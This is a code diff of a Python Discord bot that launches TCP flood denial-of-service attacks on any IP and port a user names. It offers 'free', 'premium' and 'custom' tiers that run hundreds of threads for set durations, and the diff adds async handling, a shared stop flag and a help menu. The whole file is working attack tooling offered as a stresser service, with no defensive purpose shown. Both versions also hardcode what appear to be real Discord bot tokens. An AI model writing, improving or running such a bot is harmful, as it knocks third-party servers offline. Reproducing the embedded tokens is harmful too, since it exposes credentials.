@@ -1,122 +1,107 @@
-from discord.ext import commands
 import discord
+from discord.ext import commands
 import threading
-import time
+import asyncio
 import socket
 
-# Your bot token
-TOKEN = 'OTA0MzY2MTcwMTQ3MjU4Mzg4.GyPYc2.Udi-c777-ehATTMjhkDEHdf5zCUDrpWCqw4qv0'
+TOKEN = 'OTA0MzY2MTcwMTQ3MjU4Mzg4.GFrRRv.SNeGBW-ZZ7FJ_F3n7b6UHAL8cHxf2vmhh6YrkA'
 intents = discord.Intents.default()
 intents.message_content = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Function to send TCP requests
-def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
-    while not stop_event.is_set():
-        try:
-            # Create a socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Shared flag to control the attack threads
+stop_attack_flag = threading.Event()
 
-            # Connect to the target server
+def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
+    while not stop_event.is_set() and not stop_attack_flag.is_set():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, port))
 
-            # Create the request
             request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
-            request += b"A" * bytes_to_send  # Add the specified number of bytes to the request
+            request += b"A" * bytes_to_send
             s.send(request)
 
-            # Close the socket
             s.close()
 
         except Exception as e:
             print("An error occurred:", str(e))
             break
 
-# Function to start the attack
-def start_attack(ctx, ip, port, bytes_to_send, num_threads, connections_per_thread, duration, method):
+async def start_attack(ctx, ip_port, bytes_to_send, num_threads, connections_per_thread, duration, method, custom_emoji, custom_message):
     try:
-        # Resolve domain to IP address
-        target_ip = socket.gethostbyname(ip)
-    except socket.gaierror as e:
-        ctx.send("Failed to resolve domain. Error: " + str(e))
+        target_ip, port = ip_port.split(':')
+        target_ip = socket.gethostbyname(target_ip)
+        port = int(port)
+    except (socket.gaierror, ValueError) as e:
+        await ctx.send(f"❌ Invalid IP or port format. Error: {str(e)}")
         return
 
-    # Create a stop event
-    stop_event = threading.Event()
+    global stop_attack_flag
+    stop_attack_flag = threading.Event()
 
-    # Start the threads
     threads = []
     for _ in range(num_threads):
-        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_event))
+        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_attack_flag))
         t.start()
         threads.append(t)
 
-    # Send a message to indicate the attack has started
-    embed = discord.Embed(title=f"{method.capitalize()} Attack Started", description=f"Attacking {ip}:{port} with {num_threads} threads and {connections_per_thread} connections per thread.", color=discord.Color.green())
-    ctx.send(embed=embed)
+    embed = discord.Embed(title=f"{custom_emoji} {method.capitalize()} Attack Started", description=f"{custom_message} {target_ip}:{port} with {num_threads} threads and {connections_per_thread} connections per thread.", color=discord.Color.green())
+    await ctx.send(embed=embed)
 
-    # Wait for the specified duration
-    time.sleep(duration)
+    await asyncio.sleep(duration)
 
-    # Set the stop event to stop the threads
-    stop_event.set()
+    stop_attack_flag.set()
 
-    # Wait for all threads to finish
     for t in threads:
         t.join()
 
-    # Send a message to indicate the attack has stopped
-    embed = discord.Embed(title=f"{method.capitalize()} Attack Stopped", description=f"Stopped attacking {ip}:{port}.", color=discord.Color.red())
-    ctx.send(embed=embed)
+    embed = discord.Embed(title=f"🛑 {method.capitalize()} Attack Stopped", description=f"Stopped attacking {target_ip}:{port}.", color=discord.Color.red())
+    await ctx.send(embed=embed)
 
-# Function to stop the attack
-def stop_attack(ctx):
-    # Create a stop event
-    stop_event = threading.Event()
+async def stop_attack(ctx):
+    global stop_attack_flag
+    stop_attack_flag.set()
+    embed = discord.Embed(title="🛑 Stopping Attack", description="Stopping the current attack...", color=discord.Color.orange())
+    await ctx.send(embed=embed)
+    # Perform any necessary cleanup here
 
-    # Set the stop event to stop the threads
-    stop_event.set()
+# Remove the default help command
+bot.remove_command('help')
 
-    # Send a message to indicate the attack has stopped
-    embed = discord.Embed(title="Attack Stopped", description="Stopped the current attack.", color=discord.Color.red())
-    ctx.send(embed=embed)
+# Define your custom help command
+@bot.command()
+async def help(ctx):
+    embed = discord.Embed(title="🤖 Bot Commands", color=discord.Color.blue())
+    embed.add_field(name="!free [ip:port]", value="Start a free attack on the specified IP and port.", inline=False)
+    embed.add_field(name="!premium [ip:port]", value="Start a premium attack on the specified IP and port.", inline=False)
+    embed.add_field(name="!stop", value="Stop the current attack.", inline=False)
+    await ctx.send(embed=embed)
 
-# Function to resolve the domain
-def resolve_domain(ctx, ip):
-    try:
-        # Resolve domain to IP address
-        target_ip = socket.gethostbyname(ip)
-
-        # Get server info
-        server_info = get_server_info(target_ip)
-
-        # Send a message with the server info
-        embed = discord.Embed(title="Server Information", description=f"IP: {target_ip}\nOnline Players: {server_info['players']['online']}\nMOTD: {server_info['description']['text']}\nPing: {server_info['ping']} ms\nProtocol: {server_info['version']['protocol']}", color=discord.Color.blue())
-        ctx.send(embed=embed)
-
-    except socket.gaierror as e:
-        ctx.send("Failed to resolve domain. Error: " + str(e))
-
-# Command to start the attack
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        await ctx.send("❌ Command not found. Type `!help` to see available commands.")
+    elif isinstance(error, commands.MissingRequiredArgument):
+        await ctx.send("❌ Missing required argument. Check the command format using `!help`.")
+    else:
+        print(f"An error occurred: {error}")
 
 @bot.command()
-async def free(ctx, ip: str, port: int):
-    await start_attack(ctx, ip, port, 0, 200, 10000000000, 60, 'free')
+async def free(ctx, ip_port: str):
+    await start_attack(ctx, ip_port, 0, 200, 10000000000, 60, 'free', '⚔️', 'Attacking')
 
 @bot.command()
-async def premium(ctx, ip: str, port: int):
-    await start_attack(ctx, ip, port, 0, 480, 100000000000, 120, 'premium')
+async def premium(ctx, ip_port: str):
+    await start_attack(ctx, ip_port, 0, 480, 100000000000, 120, 'premium', '🔒', 'Initiating premium attack on')
 
-# Command to stop the attack
+@bot.command()
+async def custom(ctx, ip_port: str, duration: int):
+    await start_attack(ctx, ip_port, 0, 480, 100000000000, duration, 'premium', '🎮', 'Custom attack running on')
+
 @bot.command()
 async def stop(ctx):
-    stop_attack(ctx)
+    await stop_attack(ctx)
 
-# Command to resolve the domain
-@bot.command()
-async def resolve(ctx, ip: str):
-    resolve_domain(ctx, ip)
-
-# Start the bot
 bot.run(TOKEN)
